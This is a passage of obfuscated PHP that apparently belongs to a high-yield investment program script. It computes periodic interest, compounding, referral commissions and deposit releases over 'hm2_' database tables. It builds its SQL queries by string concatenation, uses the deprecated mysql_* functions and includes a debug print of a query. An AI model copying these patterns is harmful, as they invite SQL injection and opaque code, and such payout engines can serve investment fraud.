          $elnlcKJmF = '' . ' (' . $elnlcsTFJk . ' + ((' . $elnlctLoC[$elnlcFAei['elnlcnqIKs']] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $elnlcwhGPh . ') ';
        }
        else
        {
          $elnlcsTFJk = $elnlctLoC[$elnlcFAei['elnlcnqIKs']] + $elnlctLoC[$elnlcFAei['elnlcpSpq']] - (0 < $elnlctLoC[$elnlcFAei['elnlcpSpq']] ? 1 : 0);
          $elnlcKJmF = '' . ' ' . $elnlcsTFJk . ' ';
        }

        $elnlclxfTc = $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
        if ($elnlctLoC[$elnlcFAei['elnlcoxGku']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlclxfTc . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcrwQwF . ' and 
                (
                   deposit_date + interval ' . $elnlcKJmF . ' ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $elnlcKJmF . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' = 0) || (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' && (deposit_date + interval ' . $elnlctLoC[$elnlcFAei['elnlcUkac']] . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcEDGJw = mysql_query ($q);
          while ($elnlceJGNn = mysql_fetch_array ($elnlcEDGJw))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlceJGNn[$elnlcFAei['elnlcbckB']] . ',
      		amount = ' . $elnlceJGNn[$elnlcFAei['elnlcMFxj']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlceJGNn[$elnlcFAei['elnlcMFxj']] . ',
                ec = ' . $elnlceJGNn[$elnlcFAei['elnlcBBUUo']] . ',
      		date = \'' . $elnlceJGNn[$elnlcFAei['elnlcLmKDQ']] . ('' . '\' + interval ' . $elnlcsTFJk . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlceJGNn[$elnlcFAei['elnlcaQNFH']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcrwQwF . ' and 
    	       (deposit_date + interval ' . $elnlcKJmF . ' ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $elnlcKJmF . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' = 0) || (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' && (deposit_date + interval ' . $elnlctLoC[$elnlcFAei['elnlcUkac']] . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlclxfTc . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcbuwc ($elnlcRtuEV)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    $elnlclgauu = array ();
    if (($elnlcGWAnG[$elnlcFAei['elnlcSybn']] == 1 AND $elnlcRtuEV != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcoQUP']]][$elnlctLoC[$elnlcFAei['elnlcaQNFH']]] = $elnlctLoC;
    }

    $elnlcAoGJj = $elnlcFAei['elnlcuNxfU'];
    $elnlcNqTcg = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcvrEI'])
    {
      $elnlcpmRwr = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $elnlcmGLh = ' t.pay_by_button = 0 and';
    }

    if ($elnlcRtuEV == -1)
    {
      $elnlcNqTcg = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcRtuEV . ' and status = \'on\'';
    }

    if ($elnlcRtuEV == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcOvqO = mysql_query ($q) OR print mysql_error ());
    while ($elnlcGOpLU = mysql_fetch_array ($elnlcOvqO))
    {
      $elnlcrwQwF = $elnlcGOpLU[$elnlcFAei['elnlcaQNFH']];
      $elnlcakaz = fopen ('' . './tmpl_c/lock_user' . $elnlcrwQwF, 'w+');
      if (flock ($elnlcakaz, LOCK_EX))
      {
      }
      else
      {
        fclose ($elnlcakaz);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcrwQwF;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcAoGJj = $elnlcFAei['elnlcuNxfU'];
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
      while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $elnlctLoC[$elnlcFAei['elnlcqmyhh']] . ' and min_deposit = ' . $elnlctLoC[$elnlcFAei['elnlcxMcnh']];
        ($elnlcJPTW = mysql_query ($q) OR print mysql_error ());
        while ($elnlcRWVJ = mysql_fetch_array ($elnlcJPTW))
        {
          $elnlcHHzhi[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]] = $elnlcRWVJ[$elnlcFAei['elnlcNSajq']];
        }
      }

      while (0 < $elnlcAoGJj)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $elnlcpmRwr . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcrwQwF . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $elnlcmGLh . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
        $elnlcAoGJj = $elnlcFAei['elnlczkHC'];
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          ++$elnlcAoGJj;
          if (!isset ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
          {
            continue;
          }

          $elnlcFrMj = $elnlcFAei['elnlczkHC'];
          $elnlcJlpP = $elnlcFAei['elnlczkHC'];
          reset ($elnlclgauu);
          reset ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]);
          while (list ($elnlcrOrLz, $elnlcribAu) = each ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
          {
            if (($elnlcribAu[$elnlcFAei['elnlcxMcnh']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']] AND ($elnlctLoC[$elnlcFAei['elnlcMFxj']] <= $elnlcribAu[$elnlcFAei['elnlcDBMK']] OR $elnlcribAu[$elnlcFAei['elnlcDBMK']] == 0)))
            {
              $elnlcFrMj = $elnlcribAu[$elnlcFAei['elnlcaCGMK']];
            }

            if (($elnlctLoC[$elnlcFAei['elnlcMFxj']] < $elnlcribAu[$elnlcFAei['elnlcxMcnh']] AND $elnlcFrMj == 0))
            {
              $elnlcFrMj = $elnlcJlpP;
            }

            if (($elnlctLoC[$elnlcFAei['elnlcMFxj']] < $elnlcribAu[$elnlcFAei['elnlcxMcnh']] AND 0 < $elnlcFrMj))
            {
              break;
            }

            $elnlcJlpP = $elnlcribAu[$elnlcFAei['elnlcaCGMK']];
          }

          if (($elnlcribAu[$elnlcFAei['elnlcDBMK']] != 0 AND $elnlcribAu[$elnlcFAei['elnlcDBMK']] < $elnlctLoC[$elnlcFAei['elnlcMFxj']]))
          {
            $elnlcFrMj = $elnlcJlpP;
          }

          $elnlcSImc = $elnlctLoC[$elnlcFAei['elnlcMFxj']] * $elnlcFrMj / 100;
          $elnlcJUVar = '';
          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcaMACl'])
          {
            $elnlcJUVar = ' 1 day ';
          }
          else
          {
            if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'])
            {
              $elnlcJUVar = ' 1 hour ';
            }
            else
            {
              if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcIDbN'])
              {
                $elnlcJUVar = ' 7 day ';
              }
              else
              {
                if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == 'b-w')
                {
                  $elnlcJUVar = ' 14 day ';
                }
                else
                {
                  if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcrGCO'])
                  {
                    $elnlcJUVar = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcfrEd'])
                    {
                      $elnlcJUVar = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlciknW'])
                      {
                        $elnlcJUVar = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlczIjDA'])
                        {
                          $elnlcJUVar = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlciRoQ'])
                          {
                            $elnlcJUVar = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcWKGac'])
                            {
                              $elnlcJUVar = ' ' . $elnlctLoC[$elnlcFAei['elnlcnqIKs']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcFrMj == 0 AND $elnlcJUVar == ''))
          {
            continue;
          }

          $elnlcMTqaD = -1;
          $q = 'select weekday(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ') as dw');
          ($elnlcJPTW = mysql_query ($q) OR print mysql_error ());
          while ($elnlcRWVJ = mysql_fetch_array ($elnlcJPTW))
          {
            $elnlcMTqaD = $elnlcRWVJ[$elnlcFAei['elnlcrnJpI']];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ') and ')) . ' deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
          ($elnlcQlFk = mysql_query ($q) OR print mysql_error ());
          $elnlczPoo = $elnlcFAei['elnlczkHC'];
          while ($elnlcCkfS = mysql_fetch_array ($elnlcQlFk))
          {
            $elnlczPoo = $elnlcCkfS[$elnlcFAei['elnlcFxzO']];
          }

          if ($elnlczPoo == 0)
          {
            if ((5 <= $elnlcMTqaD AND $elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcMTqaD == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                    amount = ' . $elnlcSImc . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcGWAnG[$elnlcFAei['elnlcxNgII']] . number_format ($elnlctLoC[$elnlcFAei['elnlcMFxj']], 2) . ('' . ' - ' . $elnlcFrMj . ' %\',
                    actual_amount = ' . $elnlcSImc . ',
                    date = \'') . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcLWqT'])
              {
                if ((0 < $elnlcGOpLU[$elnlcFAei['elnlcycBJh']] AND 0 < $elnlcGWAnG[$elnlcFAei['elnlcTLKeu']]))
                {
                  $elnlchQAs = $elnlcSImc * $elnlcGWAnG[$elnlcFAei['elnlcTLKeu']] / 100;
                  $elnlcwKMoJ = elnlcqedaf ($elnlcGOpLU[$elnlcFAei['elnlcrMbQT']]);
                  if ($elnlcGWAnG[$elnlcFAei['elnlcwGMe']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $elnlcGOpLU[$elnlcFAei['elnlcycBJh']] . ' and status = \'on\'';
                    ($elnlcJPTW = mysql_query ($q) OR print mysql_error ());
                    $elnlcjIiQK = $elnlcFAei['elnlczkHC'];
                    while ($elnlcRWVJ = mysql_fetch_array ($elnlcJPTW))
                    {
                      $elnlcjIiQK = $elnlcRWVJ[$elnlcFAei['elnlcONzh']];
                    }

                    if ($elnlcGWAnG[$elnlcFAei['elnlccFHrc']] <= $elnlcjIiQK)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $elnlcGOpLU[$elnlcFAei['elnlcycBJh']] . ',
			amount = ' . $elnlchQAs . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $elnlcwKMoJ . '\',
			actual_amount = ' . $elnlchQAs . ',
			date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                        ec = ' . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcvrEI'] AND $elnlctLoC[$elnlcFAei['elnlczHEqS']]))
              {
                $elnlcKmtjb = floor ($elnlcSImc * $elnlctLoC[$elnlcFAei['elnlcygOsW']]) / 100;
                if (0 < $elnlcKmtjb)
                {
                  $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                      amount = -' . $elnlcKmtjb . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $elnlcKmtjb . ',
                      date = \'') . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                      ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                      str = \'gg\',
                      deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                      amount = ' . $elnlcKmtjb . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $elnlcKmtjb . ',
                      date = \'') . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                      ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $elnlcsfal = '';
          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcWKGac'])
          {
            if (($elnlctLoC[$elnlcFAei['elnlcOPMvh']] == 0 OR ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] AND $elnlctLoC[$elnlcFAei['elnlcUIkz']])))
            {
              $elnlcsfal = ', status = \'off\'';
            }

            if (($elnlctLoC[$elnlcFAei['elnlcoxGku']] == 1 AND ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] == 0 OR ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] AND $elnlctLoC[$elnlcFAei['elnlcUIkz']]))))
            {
              $elnlcJAjA = $elnlctLoC[$elnlcFAei['elnlcMFxj']];
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
                    amount = ' . $elnlctLoC[$elnlcFAei['elnlcMFxj']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcJAjA . ',
                    ec = ' . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ('' . ',
                    date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . '\' + interval ' . $elnlcJUVar . ',
                    deposit_id = ') . $elnlctLoC[$elnlcFAei['elnlcaQNFH']] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlclUjk'])
              {
                if (0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']] . ' and type = \'earning\' and user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']];
                  print $q;
                  ($elnlcCVuFs = mysql_query ($q) OR print mysql_error ());
                  $elnlcOyAT = $elnlcFAei['elnlczkHC'];
                  while ($elnlclNiOt = mysql_fetch_array ($elnlcCVuFs))
                  {
                    $elnlcOyAT = $elnlclNiOt[$elnlcFAei['elnlceitM']];
                  }

                  $elnlcqcaNc = ($elnlcJAjA + $elnlcOyAT) * $elnlctLoC[$elnlcFAei['elnlcdeOG']] / 100;
                  $elnlcwhGPh = intval ($elnlctLoC[$elnlcFAei['elnlcpSpq']]);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
		           type_id = ' . $elnlctLoC[$elnlcFAei['elnlcqmyhh']] . ',
		           deposit_date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . '\' + interval ' . $elnlcJUVar . ',
		           last_pay_date = (\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . '\' + interval ' . $elnlcJUVar . ') + interval ' . $elnlcwhGPh . ' day,
		           status = \'on\',
		           amount = ' . $elnlcqcaNc . ',
		           actual_amount = ' . $elnlcqcaNc . ',
		           compound = 0,
		           ec = ' . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $elnlcUapL = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
		           amount = -' . $elnlcqcaNc . ',
		           actual_amount = -' . $elnlcqcaNc . ',
		           type=\'deposit\',
		           date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . '\' + interval ' . $elnlcJUVar . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
		           deposit_id = ' . $elnlcUapL . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $elnlcMTqaD AND $elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']] AND $elnlctLoC[$elnlcFAei['elnlcdeOG']] <= 100) AND $elnlctLoC[$elnlcFAei['elnlcepPbi']] == 1))
              {
                if ($elnlctLoC[$elnlcFAei['elnlcAjrwP']] == 0)
                {
                  $elnlctLoC[$elnlcFAei['elnlcAjrwP']] = $elnlctLoC[$elnlcFAei['elnlcMFxj']] + 1;
                }

                if (($elnlctLoC[$elnlcFAei['elnlcQwWv']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']] AND $elnlctLoC[$elnlcFAei['elnlcMFxj']] <= $elnlctLoC[$elnlcFAei['elnlcAjrwP']]))
                {
                  if ($elnlctLoC[$elnlcFAei['elnlcxKaI']] == 1)
                  {
                    $elnlcjKTz = preg_split ('/\\s*,\\s*/', $elnlctLoC[$elnlcFAei['elnlclPAj']]);
                    if (!in_array ($elnlctLoC[$elnlcFAei['elnlcdeOG']], $elnlcjKTz))
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlcjKTz[0];
                    }
                  }
                  else
                  {
                    if ($elnlctLoC[$elnlcFAei['elnlcdeOG']] < $elnlctLoC[$elnlcFAei['elnlcapbeA']])
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlctLoC[$elnlcFAei['elnlcapbeA']];
                    }

                    if ($elnlctLoC[$elnlcFAei['elnlcnWEG']] < $elnlctLoC[$elnlcFAei['elnlcdeOG']])
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlctLoC[$elnlcFAei['elnlcnWEG']];
                    }
                  }
                }
                else
                {
                  $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlcFAei['elnlczkHC'];
                }

                if ((0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']] AND $elnlctLoC[$elnlcFAei['elnlcdeOG']] <= 100))
                {
                  $elnlcJiba = $elnlcSImc * $elnlctLoC[$elnlcFAei['elnlcdeOG']] / 100;
                  $elnlcSImc = floor ((floor ($elnlcSImc * 100000) / 100000 - floor ($elnlcJiba * 100000) / 100000) * 100) / 100;
                  if (($elnlcHHzhi[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]] == 0 OR $elnlctLoC[$elnlcFAei['elnlcMFxj']] + $elnlcJiba < $elnlcHHzhi[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                        amount = -' . $elnlcJiba . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcJiba . ',
                    		ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    		date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                                deposit_id = ') . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcJiba . ',
                    		actual_amount = actual_amount + ' . $elnlcJiba . '
                    		where id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

              elnlclvoy ($elnlctLoC[$elnlcFAei['elnlcaQNFH']], $elnlcSImc, 'date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJUVar . ' ' . $elnlcsfal . ' where id =' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcvrEI'])
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $elnlcSQAa = mysql_query ($q);
      while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
      {
        $elnlcsTFJk = $elnlctLoC[$elnlcFAei['elnlcnqIKs']] + $elnlctLoC[$elnlcFAei['elnlcpSpq']] - (0 < $elnlctLoC[delay] ? 1 : 0);
        $elnlclxfTc = $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
        if ($elnlctLoC[$elnlcFAei['elnlcoxGku']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlclxfTc . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcrwQwF . ' and 
                (deposit_date + interval ' . $elnlcsTFJk . ' ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcsTFJk . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' = 0) || (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' && (deposit_date + interval ' . $elnlctLoC[$elnlcFAei['elnlcUkac']] . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcEDGJw = mysql_query ($q);
          while ($elnlceJGNn = mysql_fetch_array ($elnlcEDGJw))
          {
            $elnlcJAjA = $elnlceJGNn[$elnlcFAei['elnlcMFxj']];
            $elnlcAWNv = 'Deposit return';
            if ($elnlctLoC[$elnlcFAei['elnlcGyDV']] != 0)
            {
              $elnlcJAjA = floor ($elnlceJGNn[$elnlcFAei['elnlcMFxj']] * (100 - $elnlctLoC[$elnlcFAei['elnlcGyDV']])) / 100;
              $elnlcAWNv = '' . 'Deposit return. ' . $elnlctLoC[$elnlcFAei['elnlcGyDV']] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $elnlceJGNn[$elnlcFAei['elnlcbckB']] . ',
      		amount = ' . $elnlcJAjA . ',
      		type=\'release_deposit\',
